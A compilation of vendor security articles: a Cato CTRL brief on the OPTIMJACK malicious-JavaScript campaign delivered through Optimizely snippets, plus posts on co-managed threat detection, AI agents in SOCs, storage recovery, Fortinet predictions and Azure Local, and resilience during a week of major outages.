Title: Cato CTRL Threat Brief and Insights on OPTIMJACK
Context: Anti-Malware inspects supported files using signatures and heuristics, while NG Anti-Malware adds machine-learning detection
Full Text:
Executive summary

On 16 November 2026, malicious JavaScript inserted into Optimizely Web Experimentation projects reached visitors through trusted websites in a campaign publicly referred to as OPTIMJACK. Public research identified affected snippets associated with 178 organizations. The payload could divert cryptocurrency payments, skim card details and deliver exploits targeting vulnerable iPhones and iPads. Optimizely says it has fixed the vulnerability and removed the injected code. The extent of successful theft and device compromise remains uncertain.

Existing Cato controls provided protection against parts of this campaign. Our findings include DGA-based blocking of connections to attacker-controlled domains where IPS was enforcing Block actions. RBI and firewall controls could also reduce exposure where the relevant policies applied. Cato subsequently added all applicable protections for the known indicators and activity to IPS and continues monitoring. We share referring-domain insights below to help explain how routine browsing led to incident-related requests. Enforcement depends on inspection coverage and enabled policies.

What happened

According to Optimizely’s initial incident report, a signup-flow flaw allowed administrator impersonation and unauthorized changes to Project JavaScript without stolen customer passwords. Web Experimentation was affected. Feature Experimentation, SDKs and legacy Full Stack were not. Optimizely says it closed the flaw at 4.10 p.m. UTC and removed the injected code by 10.24 p.m. UTC on 16 November. Its forensic investigation remained ongoing when the advisory was issued.

The altered project code was distributed through the normal snippet delivery process. To a website and its visitors, the delivery source still used a legitimate Optimizely URL and certificate. The malicious behavior was inside content the site had already authorized to run. Some implementations served the snippets through customer-owned domains, adding another reason to investigate the actual code and project history rather than a hostname alone. Analysis of the delivery mechanism describes how this trust carried the payload into visitors’ browsers.

Which brands were involved

The published inventory of affected web properties includes BBC, CNN, Zoom, Salesforce, GitLab, HSBC, Equifax, IKEA, ASOS, Air France–KLM, Alaska Airlines and Ledger. These entries concern particular snippets and properties. They do not establish that every page, product or internal system belonging to a named brand was compromised.

Why this matters and the business risk

The incident shows how a trusted website dependency can expose customers and employees without a direct compromise of their organization’s servers. The documented payload capabilities could divert cryptocurrency payments, capture card details from accessible forms, and transmit readable cookies or page screenshots. The resulting risks include financial loss, sensitive-data exposure and possible misuse of exposed tokens. Hosted payment iframes and HttpOnly cookies limited particular collection paths, but did not make an affected page safe as a whole.

The mobile exploit component focused on older iOS versions. Published analysis reports that the exploit-kit code identified iOS 18.7.3 and later in the iOS 18 branch, and iOS 26.3 and later in the iOS 26 branch, as patched. Delivery alone does not establish device compromise. Businesses may face fraud investigations, recovery costs and loss of trust. Vendor cleanup cannot reverse theft or data disclosure. Assessing potential exposure also includes employees browsing affected external websites.

Cato CTRL insights

Cato CTRL’s referrer analysis illustrates how visits to familiar websites led to requests to malicious infrastructure. In the observed distribution, foxnews.com accounts for 25.9% of hits, cnn.com for 13.7%, bbc.com for 11.6%, salesforce.com for 9.03% and zoom.com for 6.01%. Together, these five referrers represent approximately 66.2% of the charted hits. These are request shares, not unique users or successful infections. Our investigation identified DGA-based blocking of attacker-controlled domains where IPS was enforcing Block actions. Campaign domains were subsequently added to Cato’s threat intelligence feeds, extending IPS protection against known destinations.

Figure 1. Distribution of referring domains in Cato CTRL’s analysis. Other referrers are grouped using the remaining share of the original chart. Percentages are rounded.

Cato CTRL insights into domain traffic over time

Cato’s hourly flow observations show lower-volume connections to several campaign-related domains before the main Optimizely activity on 16 November. Traffic to the principal payload host, 1688360[.]cc, rose sharply on 16 November and returned toward baseline around the transition to 17 November within the observed window. These timings describe what was visible in Cato telemetry. Earlier connections alone do not establish attacker preparation, and flow observations do not demonstrate successful payload delivery or compromise.

Figure 2. Hourly flows observed to campaign-related domains during 12 to 17 November 2026. The principal payload host shows a concentrated burst on 16 November. Connections alone do not establish compromise.

Cato CTRL insights into changes to track js

Public analysis reported repeated changes to track.js during the campaign. Cato’s observations show 49 distinct hashes on 16 November, with sightings spanning 08.19 to 21.20 UTC. Several hashes appeared only briefly, while the final numbered hash continued to be observed later in the day. This is consistent with repeated changes to the delivered content and illustrates the limits of relying on one file hash. The chart alone does not establish 49 distinct functional versions or prove that each change was intended to evade detection.

Figure 3. First and repeat sightings of 49 distinct track.js hashes in Cato observations. Lines connect the first and last observed sightings and do not imply continuous delivery.

The attack path and the protection response

Figure 4. Attack stages, potential consequences and defensive controls. Enforcement depends on traffic visibility and the applicable policies.

Cato protection

Existing protections addressed parts of the campaign before campaign-specific indicators were added. Our analysis identified connections to attacker-controlled domains blocked by real-time ML-based DGA detection where Cato IPS was enforcing Block actions. Cato subsequently added all applicable protections for the known indicators and activity to IPS, including campaign domains in threat intelligence feeds, and continues monitoring. Central deployment distributes these updates across inspected traffic.

RBI executes web content remotely for sessions matching isolation policy, reducing endpoint exposure. The default firewall Prompt rule for Uncategorized destinations returns a warning page rather than the requested resource. Where that rule remained applicable, it could interrupt background JavaScript loading. Rule order, exceptions and destination classification affect coverage. Anti-Malware inspects supported files using signatures and heuristics, while NG Anti-Malware adds machine-learning detection. In the analyzed case, the JavaScript file was skipped because it lacked a popularity score. Anti-Malware is therefore not credited with blocking that sample.

Considerations for investigation and response

Organizations assessing potential exposure can correlate incident-related destinations and referrers with users, hosts and visit times. Network, browser and endpoint evidence can help distinguish blocked requests, payload delivery and confirmed compromise. Cato IPS and firewall events can inform that assessment.

Payment data and cryptocurrency exposure

Potential payment exposure depends on whether malicious code executed, the payload version present and the activity on the affected page during the exposure window on 16 November. Card details entered into accessible first-party forms may have been captured, while hosted cross-origin payment fields were outside the skimmer’s direct reach. Cryptocurrency transfers may have been redirected through substituted wallet addresses. A qualifying address substitution could also trigger collection of the page URL, readable cookies and a screenshot even without a completed transfer. Depending on the evidence, session revocation, rotation of exposed credentials and coordination with fraud or payment teams may be appropriate.

For iOS and iPadOS

Device-management records can help identify potentially exposed devices and their software versions. Published analysis reports that the exploit-kit code identified iOS 18.7.3 and later in the iOS 18 branch, and iOS 26.3 and later in the iOS 26 branch, as patched. This describes the analyzed exploit chains, rather than a blanket assurance about all device activity. Where exploitation is suspected, mobile forensic assessment and temporary restrictions on corporate access may be appropriate. Recovery depends on the findings, and browser-data cleanup alone does not resolve device-level compromise.

How to strengthen your protection with Cato

The following controls can help reduce exposure, depending on an organization’s policies and traffic coverage. Their availability or configuration alone does not demonstrate that a particular incident was prevented.

Newly registered domains. A review can cover NRD settings in IPS and DNS Protection, the domain-age threshold, DNS visibility and relevant DGA detections.

Uncategorized destinations. A review of Prompt or Block rules, rule order and business exceptions can help establish the applicable coverage. Prompt can interrupt background resource loading, but it is not equivalent to an unconditional Block action.

Remote Browser Isolation. Isolation may be appropriate for selected browsing categories or custom destinations. Its benefit depends on whether the relevant sessions match the isolation policy.

Anti-Malware and NG Anti-Malware. Relevant considerations include blocking actions, inspection exceptions, supported TLS inspection and whether traffic reaches the enabled engines. IPS enforcement also depends on the applicable action.

For web security teams, reducing third-party scripts on sensitive pages and applying a restrictive Content Security Policy can provide additional safeguards.

Why central protection architecture and deployment matter

This incident highlights why consistent enforcement matters as much as creating a protection. Central deployment can reduce the time and operational effort needed to distribute updates across users and locations. Effectiveness depends on traffic reaching the inspection path, sufficient visibility into encrypted connections and the applicable enforcement policies. A review of actual coverage and event history can help establish what was inspected or blocked and where further investigation may be warranted, including activity before protections were applied.

Indicators of compromise

The following domains were reported in public research associated with this campaign. Their reported roles are summarized below. Attribution remains uncertain for the final two entries. These indicators can support investigation, but a domain match alone does not establish compromise. Names are defanged for safe handling.

Title: New Gartner® Research Explores the Evolution of Co-Managed Threat Detection Services and Why Organizations Are Embracing a Co-Managed Model
Context: The new Gartner® Market Overview for Co-Managed Threat Detection Services, which names LevelBlue an Example Vendor
Full Text:
Security leaders have long faced what looked like a two-way choice: build and run every piece of security operations in-house, or hand significant operational responsibility to a managed security provider. That choice has been loosening.

Many security teams have spent years and serious budget on their own SIEM, EDR, identity security, and detection tooling. Along the way, they wrote custom detections, built workflows around them and shaped processes to fit the business. The platforms are in place and the institutional knowledge is hard-won. Finding and keeping the specialists to run it all around the clock remains a constant struggle.

Interest has grown in a model that lets teams keep the platform and the know-how while bringing in outside expertise for the heaviest work. The new Gartner® Market Overview for Co-Managed Threat Detection Services, which names LevelBlue an Example Vendor. Its summary states: “Co-managed threat detection services aid cybersecurity leaders in the day-to-day SOC operations associated with these products and require lower SOC staffing overhead.”

The middle ground has an address

The report places the model with a specific kind of organization: “Co-managed threat detection services are attractive to organizations with moderate security maturity, their own technology stack and limited SOC staffing, offering a middle ground between fully managed services and in-house operations.” The market outlook adds momentum: “The co-managed threat detection market is growing as SOC teams mature and seek to retain ownership of their technology stack, detection content and operational processes, while supplementing internal skills and capacity with provider expertise.”

We believe the phrase “retain ownership” deserves the underline. A detection library tuned over several years is an asset, and few teams want to trade it for a provider’s defaults. A team short on analysts needs a different kind of help than a team whose processes have outgrown their documentation, and knowing which problem is bigger makes for a sharper provider conversation.

Eliminate threats with LevelBlue Threat Detection, Investigation & Response.

Learn More

Decoding “managed”

Few corners of security carry as many overlapping service names. The report offers a shortcut: “Services that use the term ‘managed’ followed by a technology are more likely to be co-managed than fully managed.” Managed Detection and Response (MDR), the neighbor most often confused with co-managed services, gets its own line: “Co-managed threat detection is an independent, complementary consumption model to MDR.” The report is equally direct about the tradeoff: “Co-managed services address the need for greater customization, but require more end-user engagement and internal staffing than services such as MDR.”

Buying criteria are changing alongside the models: “End-user organizations are shifting toward outcome-based and modular service models, seeking measurable improvements and the flexibility to tailor solutions to their unique operational requirements.” Which, we believe, is what makes the desired outcome the most useful starting point for any provider conversation. Mapping the SOC workload piece by piece shows where help is needed. Detection engineering might stay in-house, round-the-clock monitoring might go to a co-managed provider, and a standalone MDR service might cover the use cases where turnkey coverage fits best.

A crowded field with new questions

The technology under these services is shifting too, as Gartner outlines how the fracturing of the SIEM landscape has introduced alternative options in the form of ISOC solutions and SDLs. AI adds another layer, and the Gartner sets a clear expectation for providers: “Providers should explain how their service will leverage AI functions and what the added benefit of using the service provider will be over and above capabilities that the technology can provide, such as acceleration of threat identification or attack surface reduction.” Adding to that, “buyers should be aware of providers’ underlying investments in AI capabilities and how these are reflected in pricing.”

These are fair questions for any buyer to put to any provider. When a SIEM or EDR platform already includes AI-driven triage, a specific answer about what the service adds on top of it is a reasonable thing to expect. We even recently described these and additional questions that should be expected of providers to answer.

LevelBlue as an Example Vendor

We're proud to see LevelBlue recognized as an Example Vendor in the report.

The company’s history is one of combining businesses: AT&T’s co-managed offering became LevelBlue, which then added Trustwave and Cybereason. We believe that history matters to security leaders, because it brought threat intelligence, detection technology and incident response together in one organization, and that shapes how co-managed engagements run day to day.

For a security leader sizing up a provider, the portfolio comes down to depth in three places: the threat intelligence behind the detections, the technology that turns that intelligence into monitoring, and the forensics and response capacity that takes over when something gets through. LevelBlue’s three major moves each added to one of them.

Intelligence and operations: When LevelBlue launched in May 2024 as a standalone managed cybersecurity business, it brought managed security services, consulting, and a threat intelligence platform backed by the Open Threat Exchange, a community of more than 235,000 security professionals. Four global SOCs and three network operations centers, monitored around the clock, anchor the delivery side. Adding onto the intelligence was the later inclusion of SpiderLabs, Trustwave's elite threat hunting, research, and intelligence team.

Detection technology: Trustwave joined in August 2025, adding MDR delivered on the Fusion Security Operations Platform, offensive security capabilities and the SpiderLabs research team. Earlier in 2025, Trustwave achieved full authorized status under both FedRAMP and StateRAMP, which matters for defense, federal, state and local work where compliance gates every procurement decision.

Response and forensics: Cybereason followed in November 2025, bringing an XDR platform, digital forensics and incident response, and a research team that now works alongside SpiderLabs. The announcement also highlights Cybereason’s strong presence in Japan and a technology-agnostic approach that spans Microsoft, SentinelOne and hybrid stacks. We believe that stack-agnostic posture matters most to teams that already own their tools.

The choice between building everything and outsourcing everything has given way to a wider set of options. LevelBlue believes the strongest security operations will come from teams that decide deliberately what to own, what to share, and which outcomes to measure, then bring in a partner whose expertise and technology fit the stack already in place.Download the full report here.

Title: Most SecOps Leaders Are Changing the L1 Role as Agent Use Grows
Context: Half (49%) of respondents said they’re hiring for new skills like AI detection engineering and automation, while two-fifths (42%) are retraining L1 analysts to supervise agents
Full Text:
The vast majority (87%) of security leaders are redesigning their security operations centers (SOCs) because of AI agents, but roles are being adapted rather than eliminated, according to Strike48.

The security startup polled 534 security and IT leaders at organizations with 200 or more employees and a security operations function in the UK, Canada and US to produce its latest report: The State of Agentic Security H2 2026.

It revealed that agents have already gone mainstream and 74% of respondents said they have deployed the technology in their SOC, up from 36% in May. Half (49%) are using it in multiple use cases.

However, L1/Tier-1 analysts are being redeployed rather than replaced. Half (49%) of respondents said they’re hiring for new skills like AI detection engineering and automation, while two-fifths (42%) are retraining L1 analysts to supervise agents.

A slightly smaller share (38%) are moving L1s into investigation roles while 30% are even growing their team with more entry-level analysts.

Read more: AI SOCs Will Still Need SOC Analysts, Security Vendors Say

The findings will allay common concerns in the industry that AI will take the roles of entry-level SecOps employees, eliminating a vital career on ramp.

A Swimlane report from September revealed that a quarter (24%) of SOC analysts feel the technology has limited their ability to build skills. One in 10 said they expect fewer opportunities for junior analysts to gain experience.

Building Trust for Autonomy

The report also highlighted that, despite widespread adoption of agents in the SOC, a lack of trust is constraining organizations' ability to make the most of deployments.

Only 30% of teams claim to allow their agents to act with high or full autonomy, while half (47%) keep humans executing actions or preapproving them, and a quarter (23%) let agents act within defined boundaries.

Trust seems to rise as use cases expand and governance is put in place. Respondents’ top five requirements for trusted autonomy are:

Proven accuracy in their environment over time (57%)

A full audit trail of every action and the data behind it (53%)

Technical enforcement that the agent cannot exceed limits, not just instructions telling it not to (46%)

A precisely defined scope for each agent (44%)

A reliable rollback or undo for any action (40%)

“Most teams start the same way: one agent, one long prompt telling it to act like a Level 1 analyst, and a pile of tools bolted on. Then it meets a real alert queue, and you find out a single prompt can’t carry an entire triage process. In my view, this is why distrust of agent outputs is highest for teams with just one use case,” Tim Leehealy, co-founder and president, Strike48, told Infosecurity.

“I’d argue the models are mature enough. What’s immature is how most teams use them. The SOC teams that get to agent autonomy break the work into narrow jobs and fixed, deterministic workflow steps.”

Title: AI-powered cyber threats are changing the rules of enterprise recovery
Context: These questions are becoming increasingly important as organizations confront both traditional threats and emerging AI-powered cyberattacks
Full Text: Cybersecurity has long been a contest between attackers finding new ways in and defenders trying to keep them out. Artificial intelligence is making that contest more complicated, giving cybercriminals new ways to develop and adapt their attacks while putting additional pressure on conventional cyber defences. For enterprise IT leaders, the challenge extends beyond preventing a breach. What happens when an attacker gets through? Can compromised data be identified, clean copies recovered, and essential systems brought back online without prolonged disruption? These questions are becoming increasingly important as organizations confront both traditional threats and emerging AI-powered cyberattacks. A successful defense strategy must, therefore, account for what happens after an incident, not just the measures designed to prevent one. Making recovery part of the defence This is where cyber-resilient enterprise storage has an important role to play. Rather than relying solely on traditional backup processes, organizations need ways to protect critical data, detect potential compromise, establish which copies can safely be recovered, and restore those copies as quickly as possible. Infinidat addresses this challenge through its InfiniBox and InfiniBox SSA enterprise storage platforms, which incorporate the company’s InfiniSafe cyber resilience and recovery software suite. InfiniSafe combines immutable snapshots, which cannot be altered or deleted during their protected retention period, with logical air-gapping to isolate the management plane from the data plane. Fenced forensic environments provide a separate space for validating data before recovery. The technology also supports automated cyber protection, allowing security monitoring data center wide cyber security software applications or a Security Operations Center (SOC) to automatically talk to InfiniBoxes and trigger immutable snapshots when suspicious activity is detected. This helps reduce the window in which critical data might be exposed. For organizations concerned about recovering compromised information, optional InfiniSafe Cyber Detection uses AI-based analysis to help identify cyber affected data and locate the last known good copy of the data for recovery. Speed is another consideration. Infinidat guarantees recovery of immutable snapshots in one minute or less for InfiniBox and InfiniBox SSA, subject to the guarantee’s terms and conditions. Ultimately, cyber resilience isn’t about assuming every cyberattack can be stopped. It’s about ensuring that when defences are breached, organizations have the tools and processes to recover trusted data and limit the operational consequences. Full Text:
Security leaders preparing for 2027 need to understand how delegated access and authority shape their exposure so they can identify where stronger controls and investment are needed. As organizations integrate AI more deeply into their operations, they grant agents access to critical resources such as email, internal documents, and business applications. Some of these agents also have authority to update records, send information, or initiate transactions. While these capabilities can improve productivity, an attacker who hijacks an agent can also exploit its legitimate permissions to steal data or manipulate business processes.

Our new FortiGuard Labs report, Cybersecurity Predictions for 2027: Emerging Threats and Evolving Defensive Priorities, examines these developments and what they mean in the year ahead. It explores how attackers will exploit increasingly capable AI systems, how criminal services will evolve, and how organizations can prepare now.

We also revisit our 2026 predictions to evaluate how events have unfolded and which trends are still emerging. By distinguishing between capabilities being demonstrated in research settings and those deployed in live criminal operations, this analysis helps security leaders understand how threats are evolving and where to best focus their defenses.

Building on the Industrialization of Cybercrime

Our 2026 predictions report examined the industrialization of cybercrime and the accelerating attack lifecycle. We anticipated that greater automation and specialization would help criminals expand their capabilities and operate more efficiently, and developments observed in 2026 support that assessment. These themes are even more relevant today as AI becomes increasingly embedded in business operations and criminal workflows.

Our 2027 outlook builds on that foundation, comparing last year’s predictions with observed threat activity and exploring how emerging developments could shift attackers’ targets, the tools and services they acquire, and how organizations must begin preparing now. This includes examining how criminals will combine stolen access, specialized AI services, and more adaptive attack methods to expand their operations. For defenders, these developments call for closer scrutiny of the authority granted to automated systems, along with practical testing of their ability to detect misuse, disrupt compromised workflows, and revoke access.

A Growing Contest Over Trusted Access

When organizations authorize AI agents to retrieve information, use applications, and perform tasks, they also grant them access that attackers may seek to exploit. As a result, an agent can become a valuable target even without a conventional software vulnerability. The consequences depend on what the agent can access, what actions it can take, and whether it remains aligned with its assigned task.

These relationships extend security responsibilities beyond identity verification. Organizations need to understand how authority flows between users, agents, and connected services, and how to detect and interrupt compromised workflows. The information, integrations, and persistent context AI systems rely on add further considerations for securing access.

The Economics Behind Emerging AI Threats

Criminal adoption of AI will depend in part on whether tools and services produce useful results at an attractive cost. Access to AI resources has value, as does the ability to package models, tools, and supporting services into capabilities that other operators can purchase. Greater specialization could help participants obtain resources, adapt capabilities, and support their “customers” without building every component from scratch.

These commercial incentives could shape the next phase of AI-enabled cybercrime, but advertised capabilities don’t always translate into reliable services. Defenders need to distinguish between offerings that could significantly expand criminal capacity and those that still face substantial practical barriers. Our predictions examine how this market is likely to evolve and what would make its services useful to criminal operators.

Speed and Adaptability Require Closer Examination

AI-assisted analysis and automation will further reduce the time defenders have to assess vulnerability disclosures and protect exposed systems. Attackers will be able to coordinate more of the process of identifying targets, adapting available tools, and testing an approach. Emerging research also points to systems that can evaluate results and adjust their actions after an unsuccessful attempt.

Progress on individual tasks does not yet establish that a fully autonomous attack can operate reliably in unfamiliar environments. Practical feasibility depends on model capability, computing resources, access, and operational constraints. Our predictions consider these factors together, distinguishing developments organizations should prepare for in 2027 from possibilities that may take longer to mature.

Connecting the Outlook to Defensive Action

In 2027, organizations must retain control over delegated authority while improving their ability to turn threat intelligence into timely protection. This requires understanding their actual exposure, assigning clear responsibility for decisions, and testing the effectiveness of protective actions. As security teams automate more analysis and response, they also need confidence that the information their systems examine won’t misdirect their actions.

These priorities also extend to the broader security community. Criminal operations rely on infrastructure, service providers, financial relationships, and recruitment. Sustained cooperation can help defenders address these dependencies and make it harder for operators to recover from disruption. Prevention and early intervention can also reduce recruitment, helping limit criminal networks’ ability to replenish their capabilities.

The 2027 cybersecurity predictions report brings these considerations together to guide security planning and investment. It evaluates emerging threats, shares the evidence supporting our forecasts, and identifies the defensive actions organizations should prioritize.

Title: Fortinet Brings Network Security to Microsoft Sovereign Private Cloud on Azure Local
Context: Potential Future Tenant Isolation Microsoft has announced multitenancy as a future Azure Local capability
Full Text:
At Microsoft Ignite 2026 in San Francisco, Fortinet will discuss integrating FortiGate VM with Microsoft Azure Local. Even when an AI application runs locally, it can still query sensitive records, communicate with other workloads, and send requests to external services. With FortiGate VM validated for Azure Local, security teams can inspect traffic between workloads and set rules governing which connections can cross network boundaries. Organizations in highly regulated industries, the public sector, and critical infrastructure can deploy Fortinet’s network security capabilities alongside their sensitive workloads in sovereign private cloud environments.

Why Sovereignty Matters in the Era of Agentic AI

Traditional approaches to digital sovereignty focused heavily on data residency—the idea that data must remain within a defined geographic boundary. Large language models (LLMs) and agentic AI broaden these concerns to include systems that can make decisions, carry out tasks, and trigger actions across applications.

When organizations deploy AI agents, they grant them the authority to navigate enterprise systems, query local data, and interact with external applications. If these workflows rely on a centralized public cloud, organizations must account for three risks.

Operational control: AI training or inference can transfer data across borders, depending on where models process requests and where supporting services are hosted.

Data exposure: Sensitive prompts, proprietary model weights, and other intellectual property can be exposed through unauthorized access. Organizations also need to understand which operators can access those assets and which jurisdictions govern that access.

System disruption: Network outages or geopolitical disruptions can cut off access to public cloud data centers and interrupt workflows that rely on them.

Organizations need to understand where their AI models run, who manages the underlying infrastructure, what actions the systems can take, and how critical processes will continue when operating conditions change.

FortiGate Integrates with Azure Local

Azure Local is a hybrid infrastructure solution that brings Microsoft cloud capabilities to customer-managed environments, including support for disconnected operations. Organizations using Microsoft’s Sovereign Private Cloud to run mission-critical applications locally can also deploy FortiGate VM, Fortinet’s virtual next-generation firewall (NGFW), in that environment.

FortiGate VM can inspect traffic across Layers 4–7, help block potential threats, and support network segmentation. It can help organizations protect traffic entering or leaving the environment, as well as traffic moving laterally within it.

FortiGate VM has been validated for Microsoft Azure Local for firewalling and network visibility.

How the Partnership Supports Sovereignty and Compliance Objectives

Organizations in finance, defense, healthcare, and government often need to meet specific requirements for data movement, workload isolation, and the services that can operate independently of the public cloud. FortiGate VM on Azure Local provides capabilities organizations can use to help them address their requirements in three areas:

1. Network Security and Compliance

FortiGate on Azure Local can help organizations enforce their segmentation policies to restrict communication between sensitive workloads. Security teams can inspect traffic, limit connections across network boundaries, and log activity for investigations and compliance reviews. For example, a healthcare organization may configure which applications connect to systems that process patient data and log the connections it allows.

2. Potential Future Tenant Isolation

Microsoft has announced multitenancy as a future Azure Local capability. Once available, organizations serving different business units, agencies, or customers could use FortiGate VM to enforce network policies at each tenant’s defined boundaries. This scenario is not available today.

3. Operational Resilience in Disconnected Environments

Operational independence means critical systems can keep running during disconnected operations or network disruptions. Separately from the Azure Local validation described above, in supported disconnected deployments, FortiGate VM can continue enforcing locally configured policies and inspecting traffic between local workloads.

FortiGuard Labs conducts research worldwide, and organizations can deliver critical FortiGuard Security Services across their own networks. FortiManager can serve as a local FortiGuard server, providing antivirus and intrusion prevention system (IPS) updates, along with web and email filtering ratings and lookups. This gives managed FortiGate devices a local source for services backed by global threat research.

In fully air-gapped environments, administrators can manually import supported update packages. Where connectivity is permitted, FortiManager can synchronize those updates with the FortiGuard Distribution Network.

Title: Resilience is Security: What a week of Global Outages teaches us
Context: In the first hours, officials said there was no sign of a national security threat, but they did not rule out any cause, including a cyberattack
Full Text:
In this article

Six major outages in eight days hit email, air traffic control, airline operations, banking and consumer cloud services across North America and beyond

Most were attributed to technical faults, not attackers, and that is exactly why they’re of importance to security leaders

Resilience and security posture are one discipline, not two

Outages create the confusion, urgency and workarounds that attackers look for, and Google warns that attackers now move at machine speed

In the past eight days, people across North America lost access to their work email, their flights and their bank accounts. This morning, it was their iPhones.

On Tuesday, November 17, iCloud, the App Store, Apple Pay and other Apple services went down. Users were unexpectedly signed out of their Apple Accounts, then hit verification errors when they tried to sign back in. Developers couldn’t reach App Store Connect. For a while, Apple’s own System Status page still showed the services as available. Tom’s Guide and Digital Trends tracked a sharp spike in Downdetector reports for iCloud, Apple Pay, Sign in with Apple, Apple Business Manager and Apple Card.

It was the latest in a series of outages, and certainly not the biggest.

A Week That Stress-Tested the Digital Backbone

November 10: Apple iCloud. Apple’s sign-in and core iCloud services, including Mail, Calendar, Contacts and Photos, went down for users worldwide for nearly two hours.

November 12–14: Microsoft 365. Outlook, Teams and Copilot were disrupted for more than a day. The Associated Press reported that Downdetector received reports from users in more than 70 countries and territories. Courts, hospitals, government agencies and businesses lost their primary communication channel, and at least one public company pushed back its earnings release. Microsoft traced the incident to a fault left by an earlier network capacity upgrade, which surfaced after a more recent network change. The company stressed that it was “not related to cyber or AI / agents.”

November 13: U.S. airspace. The FAA ordered a nationwide ground stop after a communications failure hit the en route centers that manage high-altitude traffic. It was only the second such shutdown since 9/11. According to the FAA, about 3,500 aircraft already in the air landed safely. In the first hours, officials said there was no sign of a national security threat, but they did not rule out any cause, including a cyberattack.

November 16: U.S. banking. JPMorgan Chase customers spent much of Monday unable to log in or move money, and the problems spread to branches and to third-party apps that connect to Chase accounts. Customers at Bank of America, Wells Fargo, U.S. Bank and Zelle reported problems too. Chase said the cause was technical, not a cyberattack.

November 16: United Airlines. That same afternoon, a widespread United system outage delayed departures for about 90 minutes. The pilots’ union said it disrupted crew communications and the airline’s ability to provide final aircraft weight data for departing flights. United said there was no indication of a cyberattack.

November 17: Apple, again. Today’s disruption came less than 24 hours after the banking outage, and a week after Apple’s previous one.

“Was It a Cyberattack?” Why We Shouldn’t Have to Ask

When a major service goes dark, everyone asks the same thing: was it a cyber attack? This week, the answer appears to be mostly no. Microsoft pointed to a network change. Chase pointed to a technical issue. United said it saw no sign of a cyberattack. The FAA’s failure has not been attributed to an attacker.

But for the people on the other end, the cause made almost no difference. An employee who can’t reach email, a traveler stuck at the gate and a customer who can’t pay rent were all hurt the same way, whatever the root cause.

In the first hour of an incident, nobody knows the cause. The FAA’s own leadership had to leave the possibility of an attack open while technicians investigated. Security and operations teams work in that same uncertainty, so their posture has to hold up before attribution arrives, not after.

That is the core point. Availability is part of security, alongside confidentiality and integrity. A misconfigured change, a failed dependency and a ransomware attack all lead to the same outcome: the business stops. A security posture built only to stop intruders, and not to absorb disruption, is incomplete.

Outages Hand Attackers an Opening

Even when an outage has nothing to do with an attacker, attackers can still exploit it.

We have seen this before. After the July 2024 CrowdStrike update brought down Windows systems worldwide, CISA warned that threat actors were using the incident for phishing and other malicious activity. They registered lookalike domains and circulated fake “fixes.” The outage itself wasn’t malicious, but what followed was.

Now look at this week through an attacker’s eyes:

Millions of Apple users were unexpectedly signed out and asked to verify their identity again. That is an ideal setup for credential phishing that imitates “Apple Account verification” messages.

Bank customers couldn’t reach their accounts and went looking for answers. Fake support numbers, fake “account restoration” links and impersonated bank messages work best when people are already anxious.

Knowledge workers lost corporate email for a full day. Under pressure to keep working, some move to personal accounts, consumer file-sharing tools and unvetted messaging apps, outside the controls their security teams depend on.

Outages produce exactly what social engineering needs: confusion, urgency, and people willing to bend the rules to get things done.

“The Era Of Autonomous Attacks Has Arrived”

On November 16, the same day Chase and United went down, Google Threat Intelligence Group published its latest AI Threat Tracker. It declared that “the era of autonomous attacks has arrived.” Benzinga reported the warning alongside the United, FAA, JPMorgan Chase and Microsoft outages.

According to Google, attackers are now using autonomous AI frameworks to scan software updates, work out which flaw each patch fixes, and build an exploit for it without human involvement (The Hill). Google’s conclusion is blunt: defenders working at human speed can’t keep up with threats that move at machine speed.

Officially, none of this week’s outages has been tied to an attack. But the two trends compound each other. During an outage, patching slips, teams are pulled into recovery and controls get relaxed. An automated attacker doesn’t wait for the incident review. It finds the organization that is already stretched.

Concentration Risk Is a Security Risk

This week also showed how much of daily life depends on a small number of platforms. When one productivity suite, one identity service or one major bank stumbles, the impact reaches organizations that had no part in the failure. Reuters noted that the Microsoft incident deepened questions about how much the world relies on a few large technology providers. The FAA ground stop renewed concern about aging infrastructure in critical systems.

For most organizations, the honest question isn’t “Could this happen to our provider?” It is “Do we know what happens to us when it does?”

What a Resilient Security Posture Looks Like

These circumstances calls for treating resilience as an operational requirement. Some practical steps:

Map your dependencies. Know which SaaS, cloud, identity and payment providers your critical processes rely on, and what breaks downstream if each one fails.

Rehearse degraded mode. Run tabletop exercises that assume email, your identity provider or a key payment rail is gone for 24 hours. Decide in advance which workarounds are acceptable and which aren’t.

Set up out-of-band communications. Agree ahead of time on how employees, customers and partners will receive verified updates when primary channels are down. Tell people where official information will come from before they need it.

Tighten defenses during incidents, not after. Expect brand-impersonation phishing and lookalike domains to spike. Scrutinize password and MFA reset requests, and brief help desks to verify callers before acting.

Treat change management as a security control. Several of this year’s largest outages started with routine changes. Staged rollouts, tested rollback plans and configuration visibility protect availability as much as any perimeter control. Security changes count too: a patch, a new protection or a hardened configuration can disrupt production as easily as a network upgrade. Test fixes before you enforce them.

Keep controls in place under pressure. The riskiest moment is often when a business, desperate to keep running, switches safeguards off. Build fallback paths that stay secure.

Shorten the time to answer “cyber or not?” Unified visibility across network, cloud, endpoint and email lets teams quickly rule an attack in or out, and respond correctly either way.

Building Resilience with Check Point

Outages will keep happening, whether they begin with a faulty change, a failed dependency or a deliberate attack. The practical challenge is the same: keep users protected, limit the paths an attacker can exploit and maintain the visibility needed to understand what is happening before disruption spreads.

Check Point helps organizations build that resilience across the workspace, network, attack surface and security operations:

Workspace Security: protecting users when disruption creates an opening

Service interruptions create urgency, workarounds and a surge in convincing phishing and impersonation attempts. Workspace Security helps keep ransomware, malicious links and credential theft from turning operational confusion into a wider compromise.

Protects users across email, browsers, SaaS applications and endpoints.

Uses AI-driven detection and threat intelligence to identify malicious files, links and other threats before they can progress.

Helps prevent ransomware execution, contain compromised devices and protect against credential theft and data exfiltration.

Hybrid Mesh Network Security: containing impact across distributed environments

When teams are already stretched, attackers should not be able to turn one compromised user, device or connection into a broader outage. Hybrid Mesh Network Security applies consistent prevention across on-premises, cloud and remote environments.

Blocks ransomware, malicious files and exploit attempts before they move through the environment.

SASE extends protection to users connecting from outside the traditional perimeter.

Security controls across SaaS and cloud environments help protect critical data, while Zero Trust access restricts compromised identities to authorized resources.

Exposure Management: reducing risk without introducing new disruption

Resilience depends on closing the exposures that create realistic paths to critical systems, but remediation itself must not become another source of downtime. Exposure Management identifies exploitable vulnerabilities, misconfigurations, exposed assets and attack paths, then helps teams focus on the weaknesses that matter most.

Combines exposure context with current threat intelligence to prioritize weaknesses relevant to active threats.

Directs remediation toward viable paths to critical assets. In Check Point analysis, only 7.8% of vulnerability alerts were validated as Critical or High after exploitability testing.

Safe remediation validates policy and configuration changes before enforcement so teams can reduce exposure while protecting availability.

AI Security: matching threats that move at machine speed

